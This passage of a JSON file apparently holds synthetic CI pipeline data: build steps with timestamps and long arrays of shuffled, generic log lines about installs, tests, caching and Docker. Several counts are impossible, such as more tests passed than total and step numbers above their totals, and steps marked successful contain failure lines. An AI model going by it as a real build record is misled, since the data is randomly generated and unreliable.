          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:30] DEBUG: Loading configuration",
          "Test Suites: 26 passed, 32 total",
          "Done.",
          "Cache miss for key-8851",
          "GET /api - 200 (53ms)",
          "pip: Installing build dependencies...",
          "Verifying...",
          "HEAD is now at dfff783",
          "Installing eslint@4.1.6",
          "Verifying...",
          "Artifact downloaded: 40MB",
          "[12:46:30] DEBUG: Query executed in 60ms",
          "Checking out develop branch",
          "Test Suites: 38 passed, 30 total",
          "npm notice: created a lockfile",
          "Installing lodash@4.11.9",
          "Fetching submodules...",
          "Using Node.js 14.1.6",
          "Layer 2/15: ENV command",
          "[12:46:30] DEBUG: Loading configuration",
          "Pushing to registry...",
          "\u2713 Task completed in 2729ms",
          "Cache restored successfully (313MB)",
          "Creating production build...",
          "GET /health - 200 (91ms)",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling lib/utils.go...",
          "pip: Downloading lodash-2.20.tar.gz",
          "[12:46:30] DEBUG: Loading configuration",
          "Switched to branch 'hotfix/task-929'",
          "POST /upload - 201 (265ms)",
          "Step 4/20: Testing",
          "pip install: Successfully installed webpack-4.17",
          "[12:46:30] INFO: Processing request",
          "\u2717 build failed with exit code 115",
          "npm notice: package.json updated",
          "[12:46:30] INFO: Request completed",
          "Optimizing 51 modules...",
          "GET /api - 200 (10ms)",
          "[12:46:30] INFO: Connecting to database",
          "Using Python 3.9",
          "Step 18/23: Installing dependencies",
          "npm notice: created a lockfile",
          "  PASS: e2e/test_db_connect.spec.js",
          "yarn add: Done in 26.83s",
          "Installing axios@1.4.10",
          "  PASS: test_cache_hit (158ms)",
          "Compiling utils/handler.rs...",
          "Generating source maps...",
          "[12:46:30] WARN: Deprecated API usage",
          "Transforming 457 files...",
          "pip: Collecting lodash",
          "TLS handshake completed",
          "Step 15/19: Installing dependencies",
          "Step 16/22: Installing dependencies",
          "Cache restored successfully (469MB)",
          "[12:46:30] INFO: Processing request",
          "\u2713 Step 'test' succeeded",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_user_create (195ms)",
          "Done.",
          "[12:46:30] DEBUG: Query executed in 2ms",
          "Already up to date.",
          "pip: Downloading jest-2.13.tar.gz",
          "Image pulled successfully",
          "[12:46:30] INFO: Starting build process",
          "Cache miss for key-2384",
          "[12:46:30] INFO: Connecting to database",
          "Cache restored successfully (81MB)",
          "Switched to branch 'bugfix/task-957'",
          "Tests: 489 passed, 143 total",
          "Step 8/16: Testing",
          "pip: Downloading jest-3.5.tar.gz",
          "Test Suites: 28 passed, 43 total",
          "\u2713 lint completed",
          "Ready.",
          "Step 14/23: Testing",
          "[12:46:30] INFO: Cache refreshed",
          "Ready.",
          "OK",
          "HEAD is now at 779f6fe",
          "pip: Collecting axios",
          "Tests: 411 passed, 118 total",
          "Completed.",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "[12:46:30] WARN: Deprecated API usage",
          "Generating source maps...",
          "\u2713 Task completed in 3990ms",
          "Minifying vendor.js",
          "Cache miss for key-1872",
          "Optimizing 36 modules...",
          "Building Docker image...",
          "Pushing to registry...",
          "Compiling utils/handler.rs...",
          "[12:46:30] DEBUG: Connection pool: 16 active",
          "Environment: development",
          "npm notice: created a lockfile",
          "Connection established",
          "Verifying...",
          "Pushing to registry...",
          "\u2713 Step 'checkout' succeeded",
          "POST /api - 201 (301ms)",
          "[12:46:30] INFO: Processing request",
          "OK",
          "Cache miss for key-6908",
          "Pulling image: python:latest",
          "Artifact downloaded: 6MB",
          "Test Suites: 26 passed, 36 total",
          "HEAD is now at 2595505",
          "\u2713 lint completed",
          "Ran 200 tests in 39s",
          "Coverage: 78% statements, 63% branches",
          "[12:46:30] INFO: Processing request",
          "  PASS: test_auth_login (252ms)",
          "Step 10/15: Installing dependencies",
          "Time: 58.208s",
          "[12:46:30] INFO: Starting build process",
          "OK",
          "Connection established",
          "Completed.",
          "Compiling lib/service.java...",
          "GET /status - 201 (32ms)",
          "Snapshots: 45 passed, 3 total",
          "[12:46:30] DEBUG: Loading configuration",
          "[12:46:30] INFO: Connecting to database",
          "[12:46:30] WARN: Deprecated API usage",
          "[12:46:30] WARN: Deprecated API usage",
          "pip: Downloading prettier-4.19.tar.gz",
          "Uploading artifact 'build' (46 files)",
          "Test Suites: 25 passed, 20 total",
          "TLS handshake completed",
          "Compiling utils/app.ts...",
          "Connection established",
          "Uploading artifact 'coverage' (16 files)",
          "[12:46:30] DEBUG: Connection pool: 20 active",
          "Compiling src/handler.rs...",
          "Step 5/17: Deploying",
          "GET /status - 200 (30ms)",
          "Cache restored successfully (453MB)",
          "Connection established",
          "[12:46:30] INFO: Connecting to database",
          "  PASS: test_db_connect (289ms)",
          "Cache hit for key-1332",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/main.py...",
          "Compiling utils/app.ts...",
          "Test Suites: 19 passed, 41 total",
          "Tests: 357 passed, 260 total",
          "GET /health - 200 (90ms)",
          "Coverage: 85% statements, 69% branches",
          "Cache hit for key-2596",
          "pip install: Successfully installed eslint-1.9",
          "WARNING: webpack has known vulnerabilities",
          "Installing axios@3.3.2",
          "Completed.",
          "npm install: resolved 1500 packages",
          "Using Node.js 14.2.5",
          "[12:46:30] INFO: Starting build process",
          "pip install: Successfully installed express-4.20",
          "Loading...",
          "Loading...",
          "HEAD is now at d68bcd1",
          "Pulling image: node:latest",
          "Artifact downloaded: 6MB",
          "Step 11/16: Installing dependencies",
          "[12:46:30] DEBUG: Connection pool: 8 active",
          "Image pulled successfully",
          "Compiling lib/main.py...",
          "OK",
          "[12:46:30] INFO: Processing request",
          "\u2717 build failed with exit code 68",
          "Pulling image: python:3.11",
          "\u2713 Task completed in 2997ms",
          "Minifying app.js",
          "HEAD is now at 4281cc0",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:30] INFO: Starting build process",
          "Checking out main branch",
          "  PASS: test_user_create (468ms)",
          "yarn add: Done in 30.66s",
          "Waiting...",
          "Step 8/23: Linting",
          "Time: 114.972s",
          "Using Python 3.10",
          "npm install: resolved 1204 packages",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-24T12:47:03.991212",
        "finished_at": "2025-11-24T12:47:10.734478",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Cache hit for key-4342",
          "Using Python 3.11",
          "Cache invalidated: build",
          "GET /api - 204 (17ms)",
          "Step 11/20: Deploying",
          "Environment: test",
          "[12:46:30] DEBUG: Connection pool: 6 active",
          "Generating source maps...",
          "Loading...",
          "Coverage: 84% statements, 78% branches",
          "Step 17/21: Deploying",
          "Step 8/25: Deploying",
          "Completed.",
          "Fetching submodules...",
          "WARNING: axios has known vulnerabilities",
          "pip install: Successfully installed lodash-1.15",
          "Test Suites: 44 passed, 17 total",
          "Coverage: 78% statements, 92% branches",
          "Waiting...",
          "[12:46:30] INFO: Starting build process",
          "Ran 64 tests in 12s",
          "Environment: test",
          "\u2713 All checks passed",
          "[12:46:30] INFO: Connecting to database",
          "Compiling src/service.java...",
          "Bundling runtime.js",
          "[12:46:30] WARN: Deprecated API usage",
          "Tests: 151 passed, 348 total",
          "Checking out develop branch",
          "  PASS: e2e/test_api_health.spec.js",
          "Using Python 3.11",
          "NODE_ENV=development",
          "npm install: resolved 367 packages",
          "yarn add: Done in 24.98s",
          "Using Node.js 17.17.9",
          "[12:46:30] WARN: Deprecated API usage",
          "Pulling image: python:3.11",
          "\u2717 build failed with exit code 48",
          "npm notice: package.json updated",
          "Cache miss for key-9802",
          "Using Node.js 19.16.5",
          "Test Suites: 43 passed, 32 total",
          "  PASS: test_auth_login (303ms)",
          "Compiling components/main.py...",
          "POST /api - 202 (114ms)",
          "Environment: staging",
          "WARNING: jest has known vulnerabilities",
          "OK",
          "Pushing to registry...",
          "[12:46:30] INFO: Request completed",
          "Test Suites: 8 passed, 20 total",
          "Already up to date.",
          "Snapshots: 15 passed, 29 total",
          "\u2713 lint completed",
          "Image pulled successfully",
          "Compiling lib/index.js...",
          "npm notice: package.json updated",
          "npm notice: package.json updated",
          "Generating source maps...",
          "npm install: resolved 288 packages",
          "NODE_ENV=production",
          "Time: 13.299s",
          "Verifying...",
          "Bundling styles.js",
          "Bundling styles.js",
          "[12:46:30] ERROR: Connection failed",
          "Processing...",
          "Pulling image: alpine:18",
          "Done.",
          "TLS handshake completed",
          "[12:46:30] WARN: Deprecated API usage",
          "Compiling components/service.java...",
          "Loading...",
          "Artifact uploaded: dist.zip (33MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "Time: 98.259s",
          "Using Python 3.9",
          "Uploading artifact 'coverage' (45 files)",
          "Compiling utils/utils.go...",
          "Snapshots: 46 passed, 20 total",
          "[12:46:30] INFO: Request completed",
          "Loading...",
          "Compiling components/handler.rs...",
          "Cache hit for key-2889",
          "NODE_ENV=development",
          "[12:46:30] ERROR: Connection failed",
          "OK",
          "Uploading artifact 'build' (21 files)",
          "Tests: 499 passed, 265 total",
          "Snapshots: 32 passed, 40 total",
          "Exception: TypeError",
          "HEAD is now at c4d554a",
          "npm install: added 256 packages",
          "[12:46:30] INFO: Connecting to database",
          "[12:46:30] INFO: Starting build process",
          "Ready.",
          "Pulling image: node:latest",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling components/handler.rs...",
          "Pulling image: alpine:18",
          "[12:46:30] WARN: Deprecated API usage",
          "Loading...",
          "TLS handshake completed",
          "Already up to date.",
          "[12:46:30] DEBUG: Memory usage: 1137MB",
          "Layer 7/13: RUN command",
          "FAILED: test_cache_hit",
          "TLS handshake completed",
          "pip install: Successfully installed eslint-2.9",
          "pip: Installing build dependencies...",
          "FAILED: test_user_create",
          "pip: Installing build dependencies...",
          "pip: Downloading eslint-5.1.tar.gz",
          "Verifying...",
          "pip: Collecting jest",
          "Test Suites: 20 passed, 5 total",
          "Pushing to registry...",
          "Artifact downloaded: 33MB",
          "\u2713 package completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching from https://docker.io/package.json",
          "HEAD is now at 27ddae4",
          "Exception: TypeError",
          "Platform: linux-x64",
          "Compiling utils/app.ts...",
          "Pulling image: alpine:18",
          "Snapshots: 48 passed, 47 total",
          "Uploading artifact 'dist' (16 files)",
          "Compiling utils/app.ts...",
          "Artifact uploaded: dist.zip (82MB)",
          "Completed.",
          "Generating source maps...",
          "Completed.",
          "Step 13/16: Running migrations",
          "POST /api - 200 (292ms)",
          "Environment: staging",
          "WARNING: jest has known vulnerabilities",
          "Cache invalidated: node_modules",
          "Tests: 494 passed, 424 total",
          "Cache invalidated: node_modules",
          "Artifact downloaded: 17MB",
          "POST /api - 200 (56ms)",
          "Cache saved successfully",
          "Step 10/25: Building",
          "Step 5/25: Linting",
          "[12:46:30] DEBUG: Memory usage: 863MB",
          "[12:46:30] DEBUG: Query executed in 24ms",
          "[12:46:30] DEBUG: Memory usage: 835MB",
          "Pulling image: alpine:18",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Installing build dependencies...",
          "[12:46:30] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Step 2/17: Building",
          "\u2713 deploy completed",
          "Step 13/15: Deploying",
          "Artifact uploaded: dist.zip (99MB)",
          "Done.",
          "Layer 4/10: ENV command",
          "Artifact downloaded: 38MB",
          "Using Node.js 15.15.1",
          "WARNING: express has known vulnerabilities",
          "Building Docker image...",
          "[12:46:30] INFO: Processing request",
          "GET /api - 201 (83ms)",
          "Pulling image: python:3.11",
          "npm notice: created a lockfile",
          "Ready.",
          "Ran 42 tests in 15s",
          "Layer 2/12: ENV command",
          "Step 1/20: Linting",
          "[12:46:30] DEBUG: Connection pool: 6 active",
          "FAILED: test_user_create",
          "Processing...",
          "Loading...",
          "Step 20/17: Linting",
          "Cache invalidated: node_modules",
          "Artifact uploaded: dist.zip (20MB)",
          "Platform: darwin-arm64",
          "Cache miss for key-3177",
          "Layer 8/11: ENV command",
          "  PASS: test_api_health (413ms)",
          "[12:46:30] DEBUG: Query executed in 50ms",
          "Transforming 694 files...",
          "Step 4/19: Building",
          "[12:46:30] DEBUG: Memory usage: 599MB",
          "Compiling components/handler.rs...",
          "Using Node.js 14.2.4",
          "Transforming 446 files...",
          "yarn add: Done in 23.86s",
          "Loading...",
          "Processing...",
          "Step 17/22: Running migrations",
          "Building Docker image...",
          "Fetching from https://docker.io/package.json",
          "\u2713 Step 'build' succeeded",
          "Installing prettier@1.15.6",
          "Time: 38.174s",
          "[12:46:30] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (91MB)",
          "npm install: added 479 packages",
          "Pulling image: node:latest",
          "  PASS: test_cache_hit (224ms)",
          "Compiling lib/index.js...",
          "Ready.",
          "OK",
          "npm notice: created a lockfile",
          "Step 5/21: Building",
          "Processing...",
          "[12:46:30] DEBUG: Memory usage: 1239MB",
          "Minifying main.js",
          "Success!",
          "Cache hit for key-7299",
          "Ran 23 tests in 19s",
          "WARNING: jest has known vulnerabilities",
          "[12:46:30] DEBUG: Loading configuration",
          "Pushing to registry...",
          "[12:46:30] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "POST /upload - 200 (440ms)",
          "[12:46:30] ERROR: Connection failed",
          "FAILED: test_user_create",
          "Switched to branch 'feature/task-197'",
          "Step 6/21: Installing dependencies",
          "FAILED: test_user_create",
          "npm install: added 461 packages",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-24T12:47:10.734478",
        "finished_at": "2025-11-24T12:47:21.973254",
        "log_lines": [
          "=== Step: setup_node ===",
          "Layer 2/12: ENV command",
          "\u2713 validate completed",
          "OK",
          "GET /api - 204 (93ms)",
          "FAILED: test_auth_login",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:46:30] WARN: Deprecated API usage",
          "Installing express@4.19.10",
          "Step 18/21: Running migrations",
          "Ready.",
          "Transforming 499 files...",
          "\u2713 All checks passed",
          "Checking out main branch",
          "Snapshots: 20 passed, 13 total",
          "[12:46:30] ERROR: Connection failed",
          "[12:46:30] INFO: Cache refreshed",
          "[12:46:30] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Checking out main branch",
          "Minifying main.js",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Step 13/18: Testing",
          "OK",
          "  PASS: e2e/test_db_connect.spec.js",
          "  PASS: test_user_create (248ms)",
          "Platform: linux-x64",
          "npm notice: package.json updated",
          "Coverage: 94% statements, 75% branches",
          "OK",
          "Fetching from https://npmjs.org/package.json",
          "  PASS: integration/test_user_create.spec.js",
          "Done.",
          "Artifact downloaded: 16MB",
          "[12:46:30] WARN: Deprecated API usage",
          "[12:46:30] DEBUG: Memory usage: 1892MB",
          "Ready.",
          "pip: Collecting webpack",
          "Processing...",
          "Checking out develop branch",
          "[12:46:30] INFO: Cache refreshed",
          "Fetching submodules...",
          "Waiting...",
          "Success!",
          "pip: Installing build dependencies...",
          "Verifying...",
          "Artifact uploaded: dist.zip (19MB)",
          "Pulling image: node:3.11",
          "Step 3/15: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Success!",
          "Optimizing 41 modules...",
          "Compiling src/handler.rs...",
          "FAILED: test_db_connect",
          "Waiting...",
          "Bundling vendor.js",
          "Verifying...",
          "Fetching submodules...",
          "Snapshots: 10 passed, 25 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 All checks passed",
          "\u2713 test completed",
          "Compiling components/index.js...",
          "[12:46:30] WARN: Deprecated API usage",
          "Completed.",
          "Loading...",
          "Time: 41.443s",
          "Switched to branch 'bugfix/task-270'",
          "[12:46:30] INFO: Processing request",
          "Generating source maps...",
          "  PASS: test_api_health (220ms)",
          "Step 16/21: Installing dependencies",
          "npm install: resolved 1203 packages",
          "Step 9/25: Deploying",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Switched to branch 'hotfix/task-375'",
          "POST /upload - 201 (50ms)",
          "Completed.",
          "Minifying app.js",
          "OK",
          "Success!",
          "[12:46:30] DEBUG: Initializing service",
          "Creating production build...",
          "Switched to branch 'hotfix/task-134'",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Environment: test",
          "Verifying...",
          "npm install: resolved 1620 packages",
          "WARNING: express has known vulnerabilities",
          "Test Suites: 16 passed, 14 total",
          "Uploading artifact 'build' (38 files)",
          "pip install: Successfully installed lodash-1.12",
          "  PASS: unit/test_api_health.spec.js",
          "Compiling src/utils.go...",
          "npm install: added 54 packages",
          "[12:46:30] DEBUG: Query executed in 49ms",
          "Pulling image: alpine:latest",
          "Step 14/21: Testing",
          "Compiling components/app.ts...",
          "[12:46:30] INFO: Connecting to database",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:30] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Switched to branch 'bugfix/task-156'",
          "POST /upload - 202 (441ms)",
          "\u2713 validate completed",
          "Generating source maps...",
          "Fetching from https://docker.io/package.json",
          "[12:46:30] INFO: Connecting to database",
          "npm install: resolved 1061 packages",
          "npm notice: created a lockfile",
          "\u2713 deploy completed",
          "Step 17/17: Testing",
          "Building Docker image...",
          "[12:46:30] DEBUG: Connection pool: 13 active",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling lib/main.py...",
          "pip install: Successfully installed express-4.18",
          "Environment: staging",
          "Completed.",
          "Ready.",
          "Pulling image: node:latest",
          "[12:46:30] DEBUG: Memory usage: 489MB",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2717 build failed with exit code 11",
          "Completed.",
          "Already up to date.",
          "Transforming 798 files...",
          "pip install: Successfully installed eslint-5.15",
          "[12:46:30] INFO: Request completed",
          "[12:46:30] INFO: Connecting to database",
          "Cache invalidated: dependencies",
          "Environment: staging",
          "FAILED: test_api_health",
          "Using Python 3.9",
          "Image pulled successfully",
          "Fetching from https://googleapis.com/package.json",
          "[12:46:30] DEBUG: Query executed in 43ms",
          "Transforming 687 files...",
          "Bundling main.css",
          "\u2713 deploy completed",
          "Generating source maps...",
          "Generating source maps...",
          "Waiting...",
          "Platform: win32-x64",
          "Compiling lib/service.java...",
          "Compiling src/service.java...",
          "Finished.",
          "FAILED: test_api_health",
          "WARNING: axios has known vulnerabilities",
          "[12:46:30] WARN: Deprecated API usage",
          "[12:46:30] DEBUG: Query executed in 27ms",
          "Compiling src/handler.rs...",
          "Waiting...",
          "Compiling components/app.ts...",
          "Artifact uploaded: dist.zip (42MB)",
          "[12:46:30] DEBUG: Connection pool: 15 active",
          "Cache hit for key-5161",
          "Artifact uploaded: dist.zip (100MB)",
          "Step 10/17: Running migrations",
          "  PASS: test_user_create (391ms)",
          "[12:46:30] DEBUG: Query executed in 96ms",
          "  PASS: e2e/test_user_create.spec.js",
          "Step 10/22: Linting",
          "Time: 68.411s",
          "Bundling main.css",
          "Artifact downloaded: 47MB",
          "Using Node.js 14.10.5",
          "[12:46:30] WARN: Deprecated API usage",
          "Step 12/25: Testing",
          "Bundling styles.js",
          "Step 5/22: Running migrations",
          "WARNING: axios has known vulnerabilities",
          "Bundling vendor.css",
          "Success!",
          "Step 3/17: Running migrations",
          "Cache saved successfully",
          "Step 13/25: Installing dependencies",
          "Artifact uploaded: dist.zip (38MB)",
          "NODE_ENV=test",
          "npm install: resolved 259 packages",
          "Generating source maps...",
          "Using Python 3.11",
          "Generating source maps...",
          "[12:46:30] WARN: Deprecated API usage",
          "Done.",
          "TLS handshake completed",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:46:30] INFO: Starting build process",
          "Connection established",
          "pip install: Successfully installed express-5.13",
          "pip: Installing build dependencies...",
          "[12:46:30] WARN: Deprecated API usage",
          "Step 12/20: Deploying",
          "[12:46:30] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: integration/test_db_connect.spec.js",
          "Step 17/22: Installing dependencies",
          "npm notice: package.json updated",
          "[12:46:30] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Building Docker image...",
          "Compiling lib/app.ts...",
          "[12:46:30] WARN: Deprecated API usage",
          "Artifact downloaded: 47MB",
          "WARNING: webpack has known vulnerabilities",
          "pip: Downloading express-5.3.tar.gz",
          "Cache restored successfully (45MB)",
          "Cache invalidated: build",
          "pip: Installing build dependencies...",
          "Optimizing 71 modules...",
          "Time: 118.860s",
          "Step 1/25: Installing dependencies",
          "Finished.",
          "Verifying...",
          "Done.",
          "FAILED: test_auth_login",
          "Test Suites: 30 passed, 28 total",
          "yarn add: Done in 8.8s",
          "Using Python 3.12",
          "npm install: added 358 packages",
          "Artifact uploaded: dist.zip (18MB)",
          "Exception: ValueError",
          "Completed.",
          "Time: 54.919s",
          "Layer 6/15: ENV command",
          "Already up to date.",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-24T12:47:21.973254",
        "finished_at": "2025-11-24T12:47:55.689583",
        "log_lines": [
          "=== Step: unit_tests ===",
          "  PASS: integration/test_api_health.spec.js",
          "NODE_ENV=production",
          "Using Python 3.12",
          "Generating source maps...",
          "Compiling lib/service.java...",
          "Platform: darwin-arm64",
          "Completed.",
          "Waiting...",
          "Ready.",
          "Time: 62.413s",
          "GET /api - 201 (94ms)",
          "Cache hit for key-5530",
          "Step 3/15: Deploying",
          "Fetching from https://pypi.org/package.json",
          "Step 6/15: Deploying",
          "Coverage: 78% statements, 85% branches",
          "[12:46:30] DEBUG: Query executed in 66ms",
          "Image pulled successfully",
          "Cache hit for key-2571",
          "Snapshots: 29 passed, 16 total",
          "TLS handshake completed",
          "Switched to branch 'bugfix/task-482'",
          "OK",
          "HEAD is now at 9df09a1",
          "WARNING: express has known vulnerabilities",
          "HEAD is now at 70aee93",
          "Checking out master branch",
          "npm install: resolved 1343 packages",
          "Fetching from https://googleapis.com/package.json",
          "[12:46:30] DEBUG: Initializing service",
          "Cache invalidated: build",
          "Verifying...",
          "Finished.",
          "Compiling lib/utils.go...",
          "Cache restored successfully (172MB)",
          "Snapshots: 2 passed, 49 total",
          "pip install: Successfully installed express-1.12",
          "[12:46:30] INFO: Starting build process",
          "Completed.",
          "Fetching submodules...",
          "GET /status - 200 (10ms)",
          "[12:46:30] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Tests: 107 passed, 125 total",
          "\u2713 All checks passed",
          "Layer 1/12: ENV command",
          "Completed.",
          "Creating production build...",
          "pip: Collecting eslint",
          "Installing react@2.10.10",
          "Compiling lib/utils.go...",
          "FAILED: test_api_health",
          "Step 5/19: Linting",
          "Cache miss for key-1651",
          "[12:46:30] INFO: Starting build process",
          "[12:46:30] DEBUG: Query executed in 96ms",
          "Verifying...",
          "Verifying...",
          "npm install: resolved 775 packages",
          "[12:46:30] WARN: Deprecated API usage",
          "\u2713 Task completed in 1822ms",
          "Using Python 3.11",
          "[12:46:30] ERROR: Connection failed",
          "Connection established",
          "\u2713 Task completed in 4669ms",
          "Platform: win32-x64",
          "npm notice: package.json updated",
          "Step 4/23: Building",
          "Fetching submodules...",
          "Compiling src/main.py...",
          "Compiling components/index.js...",
          "\u2713 Step 'test' succeeded",
          "Ran 161 tests in 26s",
          "Using Python 3.9",
          "pip: Installing build dependencies...",
          "[12:46:30] ERROR: Connection failed",
          "Pushing to registry...",
          "Image pulled successfully",
          "[12:46:30] INFO: Processing request",
          "npm install: added 143 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 All checks passed",
          "[12:46:30] WARN: Deprecated API usage",
          "npm install: resolved 398 packages",
          "Cache restored successfully (51MB)",
          "Fetching from https://gcr.io/package.json",
          "Bundling runtime.js",
          "pip: Collecting prettier",
          "Tests: 385 passed, 277 total",
          "Generating source maps...",
          "GET /api - 204 (59ms)",
          "WARNING: express has known vulnerabilities",
          "Step 11/21: Deploying",
          "pip install: Successfully installed jest-3.17",
          "Ran 144 tests in 33s",
          "npm install: resolved 738 packages",
          "Generating source maps...",
          "Bundling runtime.js",
          "\u2713 Step 'build' succeeded",
          "Optimizing 21 modules...",
          "Processing...",
          "Artifact downloaded: 33MB",
          "FAILED: test_db_connect",
          "Platform: linux-x64",
          "Step 16/15: Installing dependencies",
          "Image pulled successfully",
          "[12:46:30] DEBUG: Loading configuration",
          "Completed.",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 8/21: Testing",
          "Step 6/22: Running migrations",
          "Step 13/19: Testing",
          "Artifact downloaded: 17MB",
          "[12:46:30] DEBUG: Initializing service",
          "Compiling components/utils.go...",
          "Cache invalidated: build",
          "TLS handshake completed",
          "Transforming 725 files...",
          "FAILED: test_auth_login",
          "NODE_ENV=development",
          "\u2713 Step 'setup' succeeded",
          "OK",
          "Already up to date.",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Time: 12.315s",
          "Optimizing 71 modules...",
          "Pushing to registry...",
          "Minifying main.js",
          "  PASS: test_auth_login (182ms)",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (55MB)",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:30] INFO: Request completed",
          "Cache saved successfully",
          "Compiling src/handler.rs...",
          "[12:46:30] INFO: Starting build process",
          "[12:46:30] WARN: Deprecated API usage",
          "Waiting...",
          "[12:46:30] INFO: Processing request",
          "Fetching submodules...",
          "TLS handshake completed",
          "Ran 190 tests in 19s",
          "pip install: Successfully installed webpack-5.10",
          "Switched to branch 'feature/task-466'",
          "Done.",
          "Ready.",
          "npm notice: created a lockfile",
          "WARNING: express has known vulnerabilities",
          "Test Suites: 36 passed, 26 total",
          "Artifact uploaded: dist.zip (76MB)",
          "yarn add: Done in 27.84s",
          "[12:46:30] DEBUG: Loading configuration",
          "Completed.",
          "Platform: win32-x64",
          "[12:46:30] WARN: Deprecated API usage",
          "\u2713 Task completed in 2203ms",
          "Compiling components/handler.rs...",
          "\u2713 Step 'setup' succeeded",
          "NODE_ENV=production",
          "Step 9/17: Linting",
          "\u2713 All checks passed",
          "[12:46:30] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Uploading artifact 'dist' (41 files)",
          "Step 12/25: Linting",
          "Switched to branch 'hotfix/task-885'",
          "TLS handshake completed",
          "GET /health - 204 (44ms)",
          "WARNING: webpack has known vulnerabilities",
          "pip: Downloading axios-2.0.tar.gz",
          "Creating production build...",
          "Compiling src/handler.rs...",
          "[12:46:30] DEBUG: Query executed in 10ms",
          "Waiting...",
          "WARNING: axios has known vulnerabilities",
          "Building Docker image...",
          "HEAD is now at a8af725",
          "Fetching submodules...",
          "[12:46:30] INFO: Connecting to database",
          "[12:46:30] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2717 build failed with exit code 82",
          "pip install: Successfully installed eslint-1.18",
          "Artifact downloaded: 22MB",
          "Compiling src/handler.rs...",
          "[12:46:30] WARN: Deprecated API usage",
          "[12:46:30] DEBUG: Query executed in 89ms",
          "Ran 190 tests in 45s",
          "Generating source maps...",
          "[12:46:30] WARN: Deprecated API usage",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "[12:46:30] DEBUG: Initializing service",
          "Bundling main.css",
          "Pulling image: alpine:18",
          "TLS handshake completed",
          "Cache invalidated: build",
          "npm install: added 214 packages",
          "Compiling src/utils.go...",
          "Step 15/20: Running migrations",
          "Loading...",
          "\u2713 Task completed in 232ms",
          "Layer 6/11: COPY command",
          "Cache miss for key-3491",
          "Cache miss for key-3440",
          "Snapshots: 15 passed, 11 total",
          "Minifying vendor.js",
          "[12:46:30] DEBUG: Connection pool: 5 active",
          "GET /status - 204 (7ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "NODE_ENV=test",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 11/16: Deploying",
          "Tests: 86 passed, 68 total",
          "Step 12/16: Testing",
          "WARNING: prettier has known vulnerabilities",
          "\u2717 build failed with exit code 123",
          "Tests: 332 passed, 362 total",
          "Layer 1/13: RUN command",
          "[12:46:30] DEBUG: Loading configuration",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Waiting...",
          "Building Docker image...",
          "[12:46:30] INFO: Processing request",
          "Cache saved successfully",
          "Time: 92.21s",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-24T12:47:55.689583",
        "finished_at": "2025-11-24T12:48:29.405912",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "POST /data - 201 (190ms)",
          "Step 19/25: Linting",
          "OK",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Exception: ValueError",
          "pip install: Successfully installed lodash-1.1",
          "npm notice: created a lockfile",
          "\u2717 build failed with exit code 5",
          "\u2713 Task completed in 1559ms",
          "TLS handshake completed",
          "Completed.",
          "Step 19/23: Installing dependencies",
          "Fetching from https://googleapis.com/package.json",
          "Processing...",
          "[12:46:30] DEBUG: Loading configuration",
          "Platform: win32-x64",
          "npm install: added 90 packages",
          "pip: Downloading eslint-2.3.tar.gz",
          "[12:46:30] WARN: Deprecated API usage",
          "[12:46:30] DEBUG: Query executed in 81ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm notice: package.json updated",
          "Cache hit for key-2035",
          "Compiling lib/utils.go...",
          "Verifying...",
          "[12:46:30] DEBUG: Loading configuration",
          "Step 5/23: Testing",
          "\u2713 lint completed",
